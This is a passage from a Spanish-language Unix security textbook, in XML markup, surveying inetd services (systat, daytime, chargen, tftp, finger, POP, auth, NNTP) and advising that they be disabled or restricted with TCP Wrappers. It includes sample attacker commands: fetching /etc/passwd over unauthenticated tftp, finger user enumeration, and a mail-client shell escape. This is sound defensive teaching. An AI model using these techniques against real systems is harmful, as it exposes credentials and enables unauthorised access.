&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;kill&#x00A0;-HUP&#x00A0;&#x2018;ps&#x00A0;-auxw|grep&#x00A0;inetd|grep&#x00A0;-v&#x00A0;grep|awk&#x00A0;&#x2019;{print&#x00A0;$2}&#x2019;&#x2018;
</literallayout>
<!--l. 69--><para>
  </para></section><!--end section--><!--l. 69--><section 
role="section"><title><abbrev role="title-mark">14.2</abbrev><anchor 
   id="x1-20600014.2"  ></anchor>Servicios b&#x00E1;sicos de red</title>
<!--l. 70--><para>  Dentro de este apartado vamos a comentar brevemente la funci&#x00F3;n de algunos servicios de Unix y sus
potenciales problemas de seguridad. Los aqu&#x02CA;&#x0131; expuestos son servicios que habitualmente han de estar
cerrados, por lo que no implican excesivos problemas de seguridad conocidos. As&#x02CA;&#x0131;, no vamos a entrar en
muchos detalles con ellos; en puntos siguientes hablaremos con m&#x00E1;s extensi&#x00F3;n de otros servicios que suelen
estar ofrecidos en todas las m&#x00E1;quinas, como ftp, telnet o SMTP, y que en su mayor&#x02CA;&#x0131;a presentan mayores
problemas de seguridad.
  </para><!--l. 78--><section 
role="subsection"><title><abbrev role="title-mark">14.2.1</abbrev><anchor 
   id="x1-20700014.2.1"  ></anchor>systat</title>
<!--l. 79--><para>  El servicio systat se asocia al puerto 11 de una m&#x00E1;quina Unix, de forma que al recibir una petici&#x00F3;n
mediante TCP el demonio inetd ofrece una imagen de la tabla de procesos del sistema, por ejemplo
ejecutando una orden como ps -auwwx en Linux o ps -ef en Solaris; en algunos Unices se
ofrece la salida de &#x00F3;rdenes como who o w en lugar de la tabla de procesos: es f&#x00E1;cil con&#xFB01;gurar lo
que cada administrador desee mostrar simplemente modi&#xFB01;cando la l&#x02CA;&#x0131;nea correspondiente de
/etc/inetd.conf:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;grep&#x00A0;systat&#x00A0;/etc/inetd.conf
&#x00A0;systat&#x00A0;stream&#x00A0;&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;nowait&#x00A0;&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/bin/ps&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ps&#x00A0;-ef
&#x00A0;anita:~#
</literallayout>
<!--l. 94--><para>Bien se ofrezca la tabla de procesos o bien otro tipo de informaci&#x00F3;n sobre el sistema, este servicio es habitual
encontarlo deshabilitado, ya que cualquier dato sobre nuestro sistema (especialmente procesos, nombres
de usuario, m&#x00E1;quinas desde las que conectan&#x2026;) puede ser aprovechado por un pirata para atacar el equipo.
Si por motivos de comodidad a la hora de administrar varios hosts dentro de una red local necesitamos
tener abierto systat, debemos restringir las direcciones desde las que se puede acceder al servicio mediante
TCP Wrappers.
  </para></section><!--end subsection--><!--l. 102--><section 
role="subsection"><title><abbrev role="title-mark">14.2.2</abbrev><anchor 
   id="x1-20800014.2.2"  ></anchor>daytime</title>
<!--l. 103--><para>  El servicio daytime, asociado al puerto 13, tanto TCP como UDP, es un servicio interno de inetd (esto es,
no hay un programa externo que lo sirva, el propio inetd se encarga de ello); al recibir una conex&#x00F3;n a este
puerto, el sistema mostrar&#x00E1; la fecha y la hora, en un formato muy similar al resultado de la orden
date:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;telnet&#x00A0;rosita&#x00A0;daytime
&#x00A0;Trying&#x00A0;192.168.0.1...
&#x00A0;Connected&#x00A0;to&#x00A0;rosita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Thu&#x00A0;Apr&#x00A0;20&#x00A0;05:02:33&#x00A0;2000
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;anita:~#
</literallayout>
<!--l. 119--><para>Aunque a primera vista este servicio no represente un peligro para la integridad de nuestro
sistema, siempre hemos de recordar una norma de seguridad fundamental: s&#x00F3;lo hay que ofrecer los
servicios estrictamente necesarios para el correcto funcionamiento de nuestras m&#x00E1;quinas. Como
daytime no es un servicio b&#x00E1;sico, suele ser recomendable cerrarlo; adem&#x00E1;s, la informaci&#x00F3;n que
proporciona, aunque escasa, puede ser su&#xFB01;ciente para un atacante: le estamos indicando el estado
del reloj de nuestro sistema, lo que por ejemplo le da una idea de la ubicaci&#x00F3;n geogr&#x00E1;&#xFB01;ca del
equipo.
<!--br/-->
<!--br/-->Un servicio parecido en muchos aspectos a daytime es time (puerto 37, TCP y UDP); tambi&#x00E9;n
indica la fecha y hora del equipo, pero esta vez en un formato que no es inteligible para las
personas:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;telnet&#x00A0;rosita&#x00A0;time
&#x00A0;Trying&#x00A0;192.168.0.1...
&#x00A0;Connected&#x00A0;to&#x00A0;rosita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;[&#x2019;&#x02C6;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;anita:~#
</literallayout>
<!--l. 140--><para>Este servicio suele ser m&#x00E1;s &#x00FA;til que el anterior: aunque una persona no entienda la informaci&#x00F3;n mostrada
por time, s&#x02CA;&#x0131; que lo hace una m&#x00E1;quina Unix. De esta forma, se utiliza time en un servidor para
que las estaciones cliente puedan sincronizar sus relojes con &#x00E9;l con &#x00F3;rdenes como netdate o
rdate:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;date
&#x00A0;Thu&#x00A0;Apr&#x00A0;20&#x00A0;02:19:15&#x00A0;CEST&#x00A0;2000
&#x00A0;luisa:~#&#x00A0;rdate&#x00A0;rosita
&#x00A0;[rosita]&#x00A0;Thu&#x00A0;Apr&#x00A0;20&#x00A0;05:10:49&#x00A0;2000
&#x00A0;luisa:~#&#x00A0;date
&#x00A0;Thu&#x00A0;Apr&#x00A0;20&#x00A0;02:20:02&#x00A0;CEST&#x00A0;2000
&#x00A0;luisa:~#&#x00A0;rdate&#x00A0;-s&#x00A0;rosita
&#x00A0;luisa:~#&#x00A0;date
&#x00A0;Thu&#x00A0;Apr&#x00A0;20&#x00A0;05:11:59&#x00A0;2000
&#x00A0;luisa:~#
</literallayout>
<!--l. 159--><para>Los problemas de time son en principio los mismos que los de daytime; aunque tambi&#x00E9;n es recomendable
mantener este servicio cerrado, es m&#x00E1;s f&#x00E1;cil imaginar situaciones en las que un administrador desee ofrecer
time en varias m&#x00E1;quinas que imaginar la necesidad de ofrecer daytime.
  </para></section><!--end subsection--><!--l. 164--><section 
role="subsection"><title><abbrev role="title-mark">14.2.3</abbrev><anchor 
   id="x1-20900014.2.3"  ></anchor>netstat</title>
<!--l. 165--><para>  De la misma forma que systat ofrec&#x02CA;&#x0131;a informaci&#x00F3;n sobre el estado de nuestro sistema, netstat la ofrece
sobre el estado de nuestra red. Este servicio, asociado al puerto 15 con protocolo TCP, ejecuta una orden
como netstat (con argumentos que dependen del clon de Unix utilizado) para mostar principalmente
las conexiones activas en la m&#x00E1;quina; por ejemplo, si en Linux invocamos a netstat desde
/etc/inetd.conf con la opci&#x00F3;n &#x2018;-A inet&#x2019;, al recibir una conexi&#x00F3;n se mostrar&#x00E1; algo parecido a lo
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;telnet&#x00A0;rosita&#x00A0;netstat
&#x00A0;Trying&#x00A0;192.168.0.1...
&#x00A0;Connected&#x00A0;to&#x00A0;rosita.
&#x00A0;Escape&#x00A0;character&#x00A0;is&#x00A0;&#x2019;&#x02C6;]&#x2019;.
&#x00A0;Active&#x00A0;Internet&#x00A0;connections&#x00A0;(w/o&#x00A0;servers)
&#x00A0;Proto&#x00A0;Recv-Q&#x00A0;Send-Q&#x00A0;Local&#x00A0;Address&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Foreign&#x00A0;Address&#x00A0;&#x00A0;&#x00A0;State
&#x00A0;tcp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;rosita:netstat&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;anita:4990&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;ESTABLISHED
&#x00A0;Connection&#x00A0;closed&#x00A0;by&#x00A0;foreign&#x00A0;host.
&#x00A0;anita:~#
</literallayout>
<!--l. 186--><para>Como suced&#x02CA;&#x0131;a con systat, es recomendable deshabilitar este servicio comentando la l&#x02CA;&#x0131;nea correspondiente
de /etc/inetd.conf, o en todo caso restringir el acceso al mismo a m&#x00E1;quinas de nuestra red local,
mediante TCP Wrappers. La informaci&#x00F3;n sobre el estado del sistema de red &#x2013; o al menos de parte del
mismo &#x2013; puede ser muy &#x00FA;til para un atacante, ya que por ejemplo le est&#x00E1; mostrando nombres de hosts y
adem&#x00E1;s le permite hacerse una idea del tr&#x00E1;&#xFB01;co que soporta la m&#x00E1;quina, de los servicios que ofrece, de los
h&#x00E1;bitos de conexi&#x00F3;n de los usuarios&#x2026;
  </para></section><!--end subsection--><!--l. 194--><section 
role="subsection"><title><abbrev role="title-mark">14.2.4</abbrev><anchor 
   id="x1-21000014.2.4"  ></anchor>chargen</title>
<!--l. 195--><para>  chargen (puerto 19, TCP y UDP) es un generador de caracteres servido internamente por inetd, que se
utiliza sobre todo para comprobar el estado de las conexiones en la red; cuando alguien accede a
este servicio simplemente ve en su terminal una secuencia de caracteres ASCII que se repite
inde&#xFB01;nidamente.
<!--br/-->
<!--br/-->Los posibles problemas de seguridad relacionados con chargen suelen ser negaciones de servicio, tanto
para la parte cliente como para la servidora. Sin duda el ejemplo m&#x00E1;s famoso de utilizaci&#x00F3;n de
chargen es una de las an&#x00E9;cdotas del experto en seguridad Tsutomu Shimomura (el principal
contribuidor en la captura de Kevin Mitnick, el pirata m&#x00E1;s famoso de los noventa): cuando
conectaba a un servidor de ftp an&#x00F3;nimo, Shimomura se di&#x00F3; cuenta de que la m&#x00E1;quina lanzaba
un &#xFB01;nger contra el cliente que realizaba la conexi&#x00F3;n. Esto no le gust&#x00F3;, y decidi&#x00F3; comprobar si
ese sistema utilizaba el &#xFB01;nger habitual; para ello modi&#xFB01;c&#x00F3; el &#xFB01;chero /etc/inetd.conf de su
sistema de forma que las peticiones &#xFB01;nger se redireccionaran al generador de caracteres chargen.
Conect&#x00F3; al servidor de nuevo, y al hacer &#x00E9;ste otro &#xFB01;nger, la m&#x00E1;quina de Shimomura se dedic&#x00F3; a
enviar megas y megas de caracteres (chargen no &#xFB01;naliza hasta que el cliente corta la conexi&#x00F3;n);
en unas pocas horas el sistema remoto qued&#x00F3; inoperativo, y a la ma~nana siguiente ese &#xFB01;nger
autom&#x00E1;tico hab&#x02CA;&#x0131;a sido eliminado de la con&#xFB01;guraci&#x00F3;n del servidor. Ese servidor no habr&#x02CA;&#x0131;a sufrido una
ca&#x02CA;&#x0131;da si hubiera utilizado safe<informalequation><graphic 
fileref="unixsec291x.gif"></graphic></informalequation>finger, un programa de Wietse Venema que se distribuye
junto a TCP Wrappers y que limita la potencial cantidad de informaci&#x00F3;n que &#xFB01;nger puede
recibir.
  </para></section><!--end subsection--><!--l. 221--><section 
role="subsection"><title><abbrev role="title-mark">14.2.5</abbrev><anchor 
   id="x1-21100014.2.5"  ></anchor>tftp</title>
<!--l. 222--><para>  tftp (Trivial File Transfer Protocol) es un protocolo de transferencia de &#xFB01;cheros asociado al puerto 69 y
basado en UDP que no proporciona ninguna seguridad. Por tanto en la mayor&#x02CA;&#x0131;a de sistemas es
obligatorio que este servicio est&#x00E9; desactivado; su uso principal es el arranque de estaciones diskless o de
routers a trav&#x00E9;s de la red, ya que la simpleza del protocolo permite implementarlo en un chip, y s&#x00F3;lo en ese
caso nos veremos obligados a ofrecer el servicio. Si es este el caso, los &#xFB01;cheros que deseemos que
sean p&#x00FA;blicos se han de situar en un determinado directorio (dependiendo del clon de Unix,
/tftpboot/, /etc/tftpboot/, /usr/local/boot/&#x2026;) o utilizar otros nombres de directorio como
argumentos del demonio en /etc/inetd.conf, algo no recomendable. Por ejemplo, si en /tftpboot/
guardamos una copia de la imagen del kernel, los clientes podr&#x00E1;n acceder a ella mediante la orden
tftp:


     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tftp&#x00A0;rosita
&#x00A0;tftp&#x003E;&#x00A0;get&#x00A0;vmlinuz
&#x00A0;Received&#x00A0;531845&#x00A0;bytes&#x00A0;in&#x00A0;3.4&#x00A0;seconds
&#x00A0;tftp&#x003E;&#x00A0;quit
&#x00A0;luisa:~#
</literallayout>
<!--l. 246--><para>Podemos ver que en ning&#x00FA;n momento se solicita un nombre de usuario o una clave, lo que nos da una idea de
los graves problemas de seguridad que el ofrecer este servicio puede implicarnos. Hasta hace unos
a~nos, era normal que los fabricantes de sistemas Unix vendieran sus productos con tftp abierto
y sin con&#xFB01;gurar, con lo que un pirata lo ten&#x02CA;&#x0131;a muy f&#x00E1;cil para conseguir cualquier &#xFB01;chero de
contrase~nas:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tftp&#x00A0;victima
&#x00A0;tftp&#x003E;&#x00A0;get&#x00A0;/etc/passwd&#x00A0;/tmp/salida
&#x00A0;Received&#x00A0;1845&#x00A0;bytes&#x00A0;in&#x00A0;0.6&#x00A0;seconds
&#x00A0;tftp&#x003E;&#x00A0;quit
&#x00A0;luisa:~#
</literallayout>
<!--l. 262--><para>
  </para></section><!--end subsection--><!--l. 262--><section 
role="subsection"><title><abbrev role="title-mark">14.2.6</abbrev><anchor 
   id="x1-21200014.2.6"  ></anchor>&#xFB01;nger</title>
<!--l. 263--><para>  T&#x02CA;&#x0131;picamente el servicio &#xFB01;nger (puerto 79, TCP) ha sido una de las principales fuentes de
problemas de Unix. Este protocolo proporciona informaci&#x00F3;n &#x2013; demasiado detallada &#x2013; de los usuarios
de una m&#x00E1;quina, est&#x00E9;n o no conectados en el momento de acceder al servicio; para hacerlo, se
utiliza la aplicaci&#x00F3;n finger desde un cliente, d&#x00E1;ndole como argumento un nombre de m&#x00E1;quina
precedido del s&#x02CA;&#x0131;mbolo &#x2018;@&#x2019; y, opcionalmente, de un nombre de usuario (finger sobre el sistema
local no utiliza el servicio de red, por lo que no lo vamos a comentar aqu&#x02CA;&#x0131;). En el primer caso,
finger nos dar&#x00E1; datos generales de los usuarios conectados en ese momento a la m&#x00E1;quina, y
en el segundo nos informar&#x00E1; con m&#x00E1;s detalle del usuario especi&#xFB01;cado como par&#x00E1;metro, est&#x00E9; o no
conectado:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;finger&#x00A0;@rosita
&#x00A0;[rosita]
&#x00A0;Login&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Name&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Tty&#x00A0;&#x00A0;&#x00A0;Idle&#x00A0;&#x00A0;Login&#x00A0;Time&#x00A0;&#x00A0;&#x00A0;Office&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Office&#x00A0;Phone
&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Toni&#x00A0;at&#x00A0;ROSITA&#x00A0;&#x00A0;&#x00A0;&#x00A0;*/0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;28&#x00A0;&#x00A0;Apr&#x00A0;20&#x00A0;04:43&#x00A0;(anita)
&#x00A0;root&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;El&#x00A0;Spiritu&#x00A0;Santo&#x00A0;&#x00A0;&#x00A0;&#x00A0;1&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;12&#x00A0;&#x00A0;Apr&#x00A0;11&#x00A0;02:10
&#x00A0;anita:~#&#x00A0;finger&#x00A0;toni@rosita
&#x00A0;[rosita]
&#x00A0;Login:&#x00A0;toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Name:&#x00A0;Toni&#x00A0;at&#x00A0;ROSITA
&#x00A0;Directory:&#x00A0;/home/toni&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Shell:&#x00A0;/bin/bash
&#x00A0;On&#x00A0;since&#x00A0;Thu&#x00A0;Apr&#x00A0;20&#x00A0;04:43&#x00A0;(CEST)&#x00A0;on&#x00A0;pts/0&#x00A0;from&#x00A0;anita
&#x00A0;&#x00A0;&#x00A0;&#x00A0;30&#x00A0;minutes&#x00A0;28&#x00A0;seconds&#x00A0;idle
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;(messages&#x00A0;off)
&#x00A0;No&#x00A0;mail.
&#x00A0;No&#x00A0;Plan.
&#x00A0;anita:~#
</literallayout>
<!--l. 293--><para>Como podemos ver, &#xFB01;nger est&#x00E1; proporcionando mucha informaci&#x00F3;n que podr&#x02CA;&#x0131;a ser de utilidad para un
atacante: nombres de usuario, h&#x00E1;bitos de conexi&#x00F3;n, cuentas inactivas&#x2026;incluso algunas organizaciones rellenan
exhaustivamente el campo gecos del &#xFB01;chero de contrase~nas, con datos como n&#x00FA;meros de habitaci&#x00F3;n de los
usuarios o incluso su tel&#x00E9;fono. Est&#x00E1; claro que esto es f&#x00E1;cilmente aprovechable por un pirata para practicar
ingenier&#x02CA;&#x0131;a social contra nuestros usuarios &#x2013; o contra el propio administrador &#x2013;. Es b&#x00E1;sico para la integridad
de nuestras m&#x00E1;quinas deshabilitar este servicio, restringir su acceso a unos cuantos equipos de la
red local mediante TCP Wrappers o utilizar versiones del demonio fingerd como ph (Phone
Book), que permiten especi&#xFB01;car la informaci&#x00F3;n que se muestra al acceder al servicio desde cada
m&#x00E1;quina.
  </para></section><!--end subsection--><!--l. 305--><section 
role="subsection"><title><abbrev role="title-mark">14.2.7</abbrev><anchor 
   id="x1-21300014.2.7"  ></anchor>POP</title>
<!--l. 306--><para>  El servicio POP (Post O&#xFB03;ce Protocol, puertos 109 y 110 en TCP) se utiliza para que los usuarios puedan
acceder a su correo sin necesidad de montar sistemas de &#xFB01;cheros compartidos mediante NFS: los clientes
utilizan SMTP para enviar correo y POP para recogerlo del servidor, de forma que el procesamiento se
realice en la m&#x00E1;quina del usuario. Se trata de un servicio que podr&#x02CA;&#x0131;amos considerar peligroso, por lo que &#x2013;
como el resto, pero este especialmente &#x2013; debemos deshabilitarlo a no ser que sea estrictamente necesario
ofrecerlo; en ese caso debemos restringir al m&#x00E1;ximo los lugares desde los que se puede acceder, mediante
TCP Wrappers.
<!--br/-->
<!--br/-->En algunos sistemas se utiliza POP simplemente para evitar otorgar cuentas completas a los usuarios: si s&#x00F3;lo
van a utilizar la m&#x00E1;quina para leer su correo, &#x00BF;por qu&#x00E9; ofrecerles un shell &#x2018;completo&#x2019;, con acceso a todo el
sistema? Realmente esto es cierto (ser&#x02CA;&#x0131;a un error permitir ejecutar ciertas &#x00F3;rdenes a aquellos que s&#x00F3;lo
utilizar&#x00E1;n el equipo para gestionar su correo), pero en muchas ocasiones esta soluci&#x00F3;n no es del todo
conveniente: aparte de los peligros que implica un servicio adicional, que de otra forma no utilizar&#x02CA;&#x0131;amos &#x2013;
en algunos demonios de POP han surgido bugs que incluso otorgaban un privilegio de root remoto sin
necesidad de ninguna clave &#x2013;, estamos generando un tr&#x00E1;nsito peligroso de contrase~nas a trav&#x00E9;s de la red. POP
ofrece tres modelos distintos de autenticaci&#x00F3;n: uno basado en Kerberos, apenas utilizado, otro basado en un
protocolo desaf&#x02CA;&#x0131;o&#x2013;respuesta (APOP, que tampoco se suele utilizar), y otro basado en un simple
nombre de usuario con su password correspondiente. Este &#x00FA;ltimo, el m&#x00E1;s usado en todo tipo de
entornos, es un excelente objetivo para un pirata con un sni&#xFB00;er: los usuarios suelen con&#xFB01;gurar sus
clientes para que chequeen el buz&#x00F3;n de correo cada pocos minutos, con lo que a intervalos muy
cortos env&#x02CA;&#x0131;an su clave a un puerto conocido de una m&#x00E1;quina conocida; al realizar toda esta
comunicaci&#x00F3;n en texto claro, un atacante no tiene m&#x00E1;s que interceptar la sesi&#x00F3;n POP para averiguar
nombres de usuario y claves (aparte de poder leer el correo que baja del servidor al cliente). Si
lo que deseamos es que nuestros usuarios no disfruten de una cuenta completa simplemente

para gestionar su correo, podemos sustituir su shell en /etc/passwd por el nombre de dicho
lector:

     </para><literallayout role="verbatim">
&#x00A0;ircd:x:1001:100:Gestion&#x00A0;IRC,,,:/home/ircd:/usr/bin/pine
</literallayout>
<!--l. 346--><para>En este caso hemos de tomar una precauci&#x00F3;n adicional: la mayor&#x02CA;&#x0131;a de programas de correo (elm, pine&#x2026;)
permiten escapes al shell, procedimientos que tarde o temprano ejecutan con &#x00E9;xito un int&#x00E9;rprete de &#x00F3;rdenes;
por ejemplo, con elm no tenemos m&#x00E1;s que iniciar vi para escribir un mensaje y en el editor ejecutar
:!/bin/sh para ejecutar este int&#x00E9;rprete. Para evitar estos escapes o bien podemos modi&#xFB01;car el c&#x00F3;digo del
gestor de correo &#x2013; algo no muy habitual &#x2013; o utilizar ya versiones modi&#xFB01;cadas disponibles a trav&#x00E9;s de
Internet.
</para><!--l. 355--><para>
  </para></section><!--end subsection--><!--l. 355--><section 
role="subsection"><title><abbrev role="title-mark">14.2.8</abbrev><anchor 
   id="x1-21400014.2.8"  ></anchor>auth</title>
<!--l. 356--><para>  Se llama socket a la combinaci&#x00F3;n de una direcci&#x00F3;n de m&#x00E1;quina y un puerto; esta entidad identi&#xFB01;ca un
proceso &#x00FA;nico en la red (<citation>[?]</citation>). Un par de sockets, uno en la m&#x00E1;quina receptora y otro en la emisora de&#xFB01;nen
una conexi&#x00F3;n en protocolos como TCP; esta conexi&#x00F3;n tambi&#x00E9;n ser&#x00E1; &#x00FA;nica en la red en un instante dado. Como
vemos, no entra en juego ning&#x00FA;n nombre de usuario: en TCP/IP se establecen canales de comunicaci&#x00F3;n entre
m&#x00E1;quinas, no entre personas; no obstante, en muchas ocasiones nos puede interesar conocer el nombre de
usuario bajo el que cierta conexi&#x00F3;n se inicia. Por ejemplo, de esta forma podr&#x02CA;&#x0131;amos ofrecer o denegar
un servicio en funci&#x00F3;n del usuario que lo solicita, aparte de la m&#x00E1;quina desde donde viene la
petici&#x00F3;n.
<!--br/-->
<!--br/-->El protocolo auth (puerto 113, TCP) viene a solucionar este problema con un esquema muy simple: cuando
un servidor necesita determinar el usuario que ha iniciado una conexi&#x00F3;n contacta con el demonio identd y
le env&#x02CA;&#x0131;a los datos necesarios para distinguir dicha conexi&#x00F3;n (los componentes de los dos sockets que
intervienen) de las dem&#x00E1;s. De esta forma, el demonio identi&#xFB01;ca al usuario en cuesti&#x00F3;n y devuelve al servidor
informaci&#x00F3;n sobre dicho usuario, generalmente su login. Por ejemplo, si utilizamos TCP Wrappers &#x2013; un
programa servidor que utiliza este mecanismo para determinar nombres de usuario siempre que sea posible
&#x2013;, se registar&#x00E1; el login del usuario remoto que solicita un servicio en nuestra m&#x00E1;quina si el sistema remoto
tiene habilitado auth:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tail&#x00A0;-2&#x00A0;~adm/syslog
&#x00A0;Apr&#x00A0;24&#x00A0;04:16:19&#x00A0;luisa&#x00A0;wu.ftpd[1306]:&#x00A0;connect&#x00A0;from&#x00A0;rosita
&#x00A0;Apr&#x00A0;24&#x00A0;04:16:21&#x00A0;luisa&#x00A0;ftpd[1306]:&#x00A0;ANONYMOUS&#x00A0;FTP&#x00A0;LOGIN&#x00A0;FROM&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rosita&#x00A0;[192.168.0.1],&#x00A0;toni@
&#x00A0;luisa:~#
</literallayout>
<!--l. 387--><para>No obstante, si el sistema desde el que esa persona conecta no tiene habilitado dicho servicio, el nombre de
usuario no se va a poder conseguir:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;tail&#x00A0;-2&#x00A0;~adm/syslog
&#x00A0;Apr&#x00A0;24&#x00A0;04:19:37&#x00A0;luisa&#x00A0;wu.ftpd[1331]:&#x00A0;connect&#x00A0;from&#x00A0;root@anita
&#x00A0;Apr&#x00A0;24&#x00A0;04:19:39&#x00A0;luisa&#x00A0;ftpd[1331]:&#x00A0;ANONYMOUS&#x00A0;FTP&#x00A0;LOGIN&#x00A0;FROM&#x00A0;&#x005C;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root&#x00A0;@&#x00A0;anita&#x00A0;[192.168.0.3],&#x00A0;toni@
&#x00A0;luisa:~#
</literallayout>
<!--l. 398--><para>El servicio auth no se debe utilizar nunca con prop&#x00F3;sitos de autenticaci&#x00F3;n robusta, ya que dependemos no de
nuestros sistemas, sino de la honestidad de la m&#x00E1;quina remota; un atacante con el su&#xFB01;ciente nivel de
privilegio en esta puede enviarnos cualquier nombre de usuario que desee. Incluso en ciertas situaciones, si
ident no est&#x00E1; habilitado ni siquiera hacen falta privilegios para devolver un nombre falso: cualquier usuario
puede hacerlo. En cambio, s&#x02CA;&#x0131; que es &#x00FA;til para detectar peque~nas violaciones de seguridad, por lo que quiz&#x00E1;s
interese habilitar el servicio en nuestras m&#x00E1;quinas (aunque limitemos su uso mediante TCP
Wrappers.
  </para></section><!--end subsection--><!--l. 408--><section 
role="subsection"><title><abbrev role="title-mark">14.2.9</abbrev><anchor 
   id="x1-21500014.2.9"  ></anchor>NNTP</title>
<!--l. 409--><para>  El servicio NNTP (Network News Transfer Protocol, puerto 119 TCP) se utiliza para intercambiar
mensajes de grupos de noticias entre servidores de news. Los diferentes demonios encargados de esta tarea
(como in.nntpd o innd) suelen discriminar conexiones en funci&#x00F3;n de la direcci&#x00F3;n o el nombre
de la m&#x00E1;quina cliente; por ejemplo, el primero utiliza el &#xFB01;chero nntp<informalequation><graphic 
fileref="unixsec292x.gif"></graphic></informalequation>access para decidir si
ofrece el servicio de news a un determinado host, y si es as&#x02CA;&#x0131; concretar de que forma puede
acceder a &#x00E9;l (s&#x00F3;lo lectura, s&#x00F3;lo ciertos grupos&#x2026;). De esta forma, los servidores NNTP son muy
vulnerables a cualquier ataque que permita falsear la identidad de la m&#x00E1;quina origen, como el IP
Spoo&#xFB01;ng.
<!--br/-->
<!--br/-->Los problemas relacionados con las news no suelen ser excesivamente graves desde un punto de vista
estrictamente t&#x00E9;cnico, pero en ocasiones s&#x02CA;&#x0131; que lo son aplicando una visi&#x00F3;n global. Por ejemplo, habr&#x02CA;&#x0131;a que
evaluar el da~no que le supone a la imagen de nuestra organizaci&#x00F3;n el que un atacante env&#x02CA;&#x0131;e mensajes
insultantes o pornogr&#x00E1;&#xFB01;cos utilizando nuestro nombre o nuestros recursos. Tambi&#x00E9;n es un problema la mala
educaci&#x00F3;n de los usuarios en materias de seguridad inform&#x00E1;tica: tienden a creer todo lo que leen en ciertos
grupos de noticias, por lo que un atacante podr&#x02CA;&#x0131;a utilizar ingenier&#x02CA;&#x0131;a social para perjudicar a nuestra
organizaci&#x00F3;n. Otra amenaza com&#x00FA;n es el uso de grupos de news privados (internos) para tratar
informaci&#x00F3;n con&#xFB01;dencial en la organizaci&#x00F3;n: esto es un error, ya que si la privacidad del servidor
se ve comprometida un atacante puede obtener datos que a priori no estar&#x02CA;&#x0131;a autorizado a
saber.
<!--br/-->
<!--br/-->Realmente, es muy poco probable que necesitemos ofrecer este servicio, por lo que lo m&#x00E1;s razonable para
nuestra seguridad es deshabilitarlo. Generalmente s&#x00F3;lo existen servidores de noticias en grandes
organizaciones &#x2013; como las universidades &#x2013;, y adem&#x00E1;s lo normal es que s&#x00F3;lo haya uno por entidad. Si debemos
administrar ese equipo la mejor forma de proteger el servicio NNTP es utilizando un buen cortafuegos
(<citation>[?]</citation>).
  </para></section><!--end subsection--><!--l. 439--><section 
role="subsection"><title><abbrev role="title-mark">14.2.10</abbrev><anchor 
   id="x1-21600014.2.10"  ></anchor>NTP</title>
<!--l. 440--><para>  NTP (Network Time Protocol, puerto 123 UDP y TCP) es un protocolo utilizado para sincronizar relojes
de m&#x00E1;quinas de una forma muy precisa; a pesar de su so&#xFB01;sticaci&#x00F3;n no fu&#x00E9; dise~nado con una idea de robustez
ante ataques, por lo que puede convertirse en una gran fuente de problemas (<citation>[?]</citation>) si no est&#x00E1; correctamente
